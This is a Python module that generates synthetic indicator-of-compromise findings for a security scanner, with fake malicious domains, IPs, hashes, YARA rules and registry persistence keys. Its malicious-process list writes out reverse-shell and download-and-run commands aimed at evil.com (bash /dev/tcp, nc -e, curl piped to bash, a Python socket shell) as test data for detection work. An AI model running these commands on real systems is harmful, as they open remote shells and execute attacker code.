"""
IOC (Indicators of Compromise) producer for generating synthetic IOC findings.
"""

from typing import Dict, List, Any
import random
import uuid
from .base_producer import BaseProducer

class IocProducer(BaseProducer):
    """Producer for synthetic IOC scanner findings."""

    def __init__(self):
        super().__init__("ioc")
        self.malicious_domains = [
            "evil-update.{tld}", "cdn-mitm.{tld}", "telemetry-{n}.badcloud.{tld}", "secure-login.{tld}/auth",
            "dropper.{tld}/payload", "c2-{n}.shadow.{tld}", "sso.{tld}.cdn-cache.net"
        ]
        self.malicious_ips = [
            "45.67.230.{octet}", "77.247.110.{octet}", "185.220.101.{octet}", "203.0.113.{octet}", "198.51.100.{octet}"
        ]
        self.malicious_urls = [
            "hxxp://{dom}/download/{n}", "hxxps://{dom}/update/{n}", "hxxp://{ip}/stash/{n}",
            "hxxp://{dom}/panel/login.php", "hxxps://{dom}/cdn/{n}/payload.bin"
        ]
        self.malicious_hashes = [
            "d41d8cd98f00b204e9800998ecf8427e", "44d88612fea8a8f36de82e1278abb02f", "81dc9bdb52d04dc20036dbd8313ed055",
            "5f4dcc3b5aa765d61d8327deb882cf99", "e99a18c428cb38d5f260853678922e03"
        ]
        self.yara_rules = [
            "rule SuspiciousPowerShell { strings: $ps = ""powershell"" nocase condition: $ps }",
            "rule CredentialDump { strings: $m = ""mimikatz"" nocase condition: $m }",
            "rule C2Beacon { strings: $j = ""ja3"" condition: $j }"
        ]
        self.registry_keys = [
            r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
            r"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack",
            r"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
        ]
        self.distro_profiles = [
            {"name": "Debian", "versions": ["11", "12"], "pkg": "apt", "weight": 0.24},
            {"name": "Ubuntu", "versions": ["20.04", "22.04", "24.04"], "pkg": "apt", "weight": 0.28},
            {"name": "Fedora", "versions": ["38", "39", "40"], "pkg": "dnf", "weight": 0.2},
            {"name": "Arch", "versions": ["rolling"], "pkg": "pacman", "weight": 0.14},
            {"name": "Alpine", "versions": ["3.18", "3.19", "3.20"], "pkg": "apk", "weight": 0.14},
        ]

    def _random_indicator(self, severity: str = "low") -> Dict[str, str]:
        from .augmentation_utils import unique_token

        tlds = ["com", "net", "org", "io", "dev", "cloud", "biz", "xyz"]
        octet = random.randint(10, 254)
        n = random.randint(1, 9999)
        dom = random.choice(self.malicious_domains).format(tld=random.choice(tlds), n=n)
        ip = random.choice(self.malicious_ips).format(octet=octet)
        url = random.choice(self.malicious_urls).format(dom=dom, ip=ip, n=n)
        # occasionally synthesize a pseudo-random hash-like token
        hash_value = random.choice(self.malicious_hashes) if random.random() < 0.6 else unique_token('h') + random.choice(['a','b','c','d'])
        yara_rule = random.choice(self.yara_rules)
        reg_key = random.choice(self.registry_keys)

        options = [
            {"type": "domain", "value": dom, "context": "known C2 hostname"},
            {"type": "ip", "value": ip, "context": "anonymizing exit or bulletproof host"},
            {"type": "url", "value": url, "context": "payload staging or panel"},
            {"type": "hash", "value": hash_value, "context": "malware sample"},
            {"type": "yara", "value": yara_rule, "context": "behavioral signature"},
            {"type": "registry", "value": reg_key, "context": "persistence mechanism"}
        ]

        weight = {
            "info": [0.25, 0.15, 0.2, 0.1, 0.1, 0.2],
            "low": [0.2, 0.2, 0.2, 0.15, 0.1, 0.15],
            "high": [0.15, 0.2, 0.25, 0.2, 0.1, 0.1],
            "critical": [0.1, 0.25, 0.25, 0.25, 0.1, 0.05]
        }.get(severity, [1/6.0] * 6)

        choice = random.choices(options, weights=weight, k=1)[0]
        # make some indicator values unique/suffixed occasionally
        if choice.get('type') in {'domain','url','ip'} and random.random() < 0.2:
            choice['value'] = f"{choice['value']}-{unique_token('i')}"
        return choice
    def _generate_normal_ioc(self) -> Dict[str, Any]:
        """Generate a normal IOC finding."""
        normal_processes = [
            "/usr/bin/gnome-shell",
            "/usr/bin/nautilus",
            "/usr/bin/firefox",
            "/usr/bin/chrome",
            "/usr/bin/code"
        ]

        process_cmd = random.choice(normal_processes)
        pid = random.randint(1000, 9999)

        indicator = self._random_indicator()

        from .augmentation_utils import unique_token
        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}_{unique_token()}",
            "title": "Process IOC Detected",
            "severity": "info",
            "risk_score": 10,
            "base_severity_score": 10,
            "description": f"Normal process detected: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "false",
                "indicator": indicator.get("value"),
                "indicator_type": indicator.get("type"),
                "context": indicator.get("context"),
                **self._sample_distro_profile(),
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "normal"],
            "risk_subscores": {
                "impact": random.uniform(0.01, 0.05),
                "exposure": random.uniform(0.01, 0.03),
                "anomaly": random.uniform(0.05, 0.15),
                "confidence": random.uniform(0.8, 0.9)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.001, 0.01),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 10,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_suspicious_ioc(self) -> Dict[str, Any]:
        """Generate a suspicious IOC finding."""
        suspicious_processes = [
            "/usr/bin/nmap",
            "/usr/bin/wireshark",
            "/usr/bin/tcpdump",
            "/usr/bin/strace",
            "/usr/bin/lsof",
            "/usr/bin/netstat",
            "/usr/bin/ss",
            "/usr/bin/whoami",
            "/usr/bin/id",
            "/usr/bin/hostname"
        ]

        process_cmd = random.choice(suspicious_processes)
        pid = random.randint(1000, 9999)

        indicator = self._random_indicator()

        from .augmentation_utils import unique_token
        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}_{unique_token()}",
            "title": "Process IOC Detected",
            "severity": "low",
            "risk_score": 30,
            "base_severity_score": 30,
            "description": f"Process with suspicious patterns: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "true",
                "indicator": indicator.get("value"),
                "indicator_type": indicator.get("type"),
                "context": indicator.get("context"),
                **self._sample_distro_profile(),
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "suspicious", "reconnaissance"],
            "risk_subscores": {
                "impact": random.uniform(0.1, 0.3),
                "exposure": random.uniform(0.2, 0.4),
                "anomaly": random.uniform(0.3, 0.6),
                "confidence": random.uniform(0.6, 0.8)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.05, 0.15),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 30,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_malicious_ioc(self) -> Dict[str, Any]:
        """Generate a malicious IOC finding."""
        malicious_processes = [
            "/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "/usr/bin/python3 -c 'import socket; s=socket.socket(); s.connect((\"evil.com\",4444)); exec(s.recv(1024).decode())'",
            "/usr/bin/wget http://evil.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware",
            "/usr/bin/curl http://evil.com/shell | bash",
            "/usr/bin/nc -e /bin/bash evil.com 4444"
        ]

        process_cmd = random.choice(malicious_processes)
        pid = random.randint(1000, 9999)

        indicator = self._random_indicator(severity="high")

        from .augmentation_utils import unique_token
        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}_{unique_token('h')}",
            "title": "Process IOC Detected",
            "severity": "high",
            "risk_score": 80,
            "base_severity_score": 80,
            "description": f"Process with malicious indicators: {process_cmd[:50]}...",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "pattern_match": "true",
                "indicator": indicator.get("value"),
                "indicator_type": indicator.get("type"),
                "context": indicator.get("context"),
                **self._sample_distro_profile(),
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "malicious", "compromise"],
            "risk_subscores": {
                "impact": random.uniform(0.7, 0.95),
                "exposure": random.uniform(0.8, 0.95),
                "anomaly": random.uniform(0.8, 0.95),
                "confidence": random.uniform(0.85, 0.95)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.7, 0.95),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 80,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_deleted_executable_ioc(self) -> Dict[str, Any]:
        """Generate a deleted executable IOC finding."""
        deleted_executables = [
            "/usr/bin/sshd (deleted)",
            "/usr/sbin/apache2 (deleted)",
            "/usr/bin/python3 (deleted)",
            "/bin/bash (deleted)",
            "/usr/bin/vim (deleted)"
        ]

        process_cmd = random.choice(deleted_executables)
        pid = random.randint(1000, 9999)

        indicator = self._random_indicator(severity="critical")

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "critical",
            "risk_score": 90,
            "base_severity_score": 90,
            "description": f"Process with deleted executable: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "deleted_executable": "true",
                "indicator": indicator.get("value"),
                "indicator_type": indicator.get("type"),
                "context": indicator.get("context"),
                **self._sample_distro_profile(),
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "critical", "deleted", "stealth"],
            "risk_subscores": {
                "impact": random.uniform(0.8, 0.95),
                "exposure": random.uniform(0.9, 0.95),
                "anomaly": random.uniform(0.9, 0.95),
                "confidence": random.uniform(0.9, 0.95)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.8, 0.95),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 90,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _generate_world_writable_executable_ioc(self) -> Dict[str, Any]:
        """Generate a world-writable executable IOC finding."""
        world_writable_executables = [
            "/home/user/.vscode/extensions/ms-python.vscode-python-envs/bin/pet",
            "/tmp/test_executable",
            "/var/tmp/malicious_binary",
            "/dev/shm/suspicious_script",
            "/run/user/1000/malware"
        ]

        process_cmd = random.choice(world_writable_executables)
        pid = random.randint(1000, 9999)

        indicator = self._random_indicator(severity="high")

        return {
            "id": f"ioc_{uuid.uuid4().hex[:8]}",
            "title": "Process IOC Detected",
            "severity": "high",
            "risk_score": 70,
            "base_severity_score": 70,
            "description": f"Process with world-writable executable: {process_cmd}",
            "metadata": {
                "command": process_cmd,
                "pid": str(pid),
                "world_writable_executable": "true",
                "indicator": indicator.get("value"),
                "indicator_type": indicator.get("type"),
                "context": indicator.get("context"),
                **self._sample_distro_profile(),
            },
            "operational_error": False,
            "category": "ioc",
            "tags": ["process", "ioc", "high", "world_writable", "tampering"],
            "risk_subscores": {
                "impact": random.uniform(0.6, 0.8),
                "exposure": random.uniform(0.7, 0.9),
                "anomaly": random.uniform(0.8, 0.95),
                "confidence": random.uniform(0.8, 0.9)
            },
            "correlation_refs": [],
            "baseline_status": "existing",
            "severity_source": "raw",
            "allowlist_reason": None,
            "probability_actionable": random.uniform(0.5, 0.8),
            "graph_degree": None,
            "cluster_id": None,
            "rationale": None,
            "risk_total": 70,
            "host_role": None,
            "host_role_rationale": None,
            "metric_drift": None
        }

    def _sample_distro_profile(self) -> Dict[str, str]:
        """Sample a distro profile to enrich IOC metadata with realistic host context."""
        weights = [p["weight"] for p in self.distro_profiles]
        profile = random.choices(self.distro_profiles, weights=weights, k=1)[0]
        version = random.choice(profile["versions"])
        kernel_minor = random.randint(1, 12)
        kernel_patch = random.randint(1, 30)
        return {
            "distro": profile["name"],
            "distro_version": version,
            "package_manager": profile["pkg"],
            "kernel": f"6.{kernel_minor}.{kernel_patch}-{profile['name'].lower()}",
        }

    def generate_findings(self, count: int) -> List[Dict[str, Any]]:
        """Generate the specified number of IOC findings."""
        findings = []

        for _ in range(count):
            scenario = self._choose_scenario()

            if scenario == "normal":
                finding = self._generate_normal_ioc()
            elif scenario == "suspicious":
                finding = self._generate_suspicious_ioc()
            elif scenario == "malicious":
                finding = self._generate_malicious_ioc()
            elif scenario == "edge_case":
                # Randomly choose between deleted executable and world-writable
                if random.random() < 0.5:
                    finding = self._generate_deleted_executable_ioc()
                else:
                    finding = self._generate_world_writable_executable_ioc()

            findings.append(finding)

        return findings